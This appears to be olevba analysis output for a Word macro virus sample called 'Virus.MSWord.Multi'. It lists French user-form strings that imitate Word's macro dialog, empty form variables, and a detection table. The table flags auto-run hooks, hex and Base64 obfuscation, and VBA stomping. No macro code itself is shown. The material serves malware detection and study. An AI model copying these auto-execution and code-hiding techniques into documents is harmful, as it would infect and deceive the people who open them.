+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Annuler
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Chemin d'acc�s:
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+H�,? 
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tous les mod�les actifs
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Nom de la macro:0
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Macros disponibles dans::
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Description:�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Ex�cuter
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Annuler
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Ex�cuter pas � pas
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Modifier
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Cr�er
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Supprimer...
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Organiser...
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Frame1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'TextBox1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CheckBox1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'0'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ScrollBar1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton3'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton4'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton5'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton6'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ListBox1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'TextBox1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ScrollBar1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ComboBox1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'Tous les mod\xe8les actifs'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'TextBox2'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton3'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton4'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton5'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton6'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton7'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ListBox1'" IN './Virus.MSWord.Multi' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoExec            |Runs when the Word document is opened        |
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoNew             |Runs when a new Word document is created     |
+|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
